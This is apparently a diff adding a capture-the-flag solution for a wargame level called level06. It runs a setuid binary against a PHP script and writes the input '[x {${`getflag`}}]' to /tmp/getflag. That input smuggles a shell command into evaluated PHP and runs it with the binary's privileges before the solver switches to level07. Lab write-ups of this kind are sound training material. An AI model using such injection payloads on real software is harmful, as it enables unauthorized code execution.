@@ -1,0 +1,9 @@
+> ls -al
+
+> ./level06 level06.php
+> cat level06.php
+> echo '[x {${`getflag`}}]' > /tmp/getflag
+> ./level06 /tmp/getflag
+
+> su level07
+
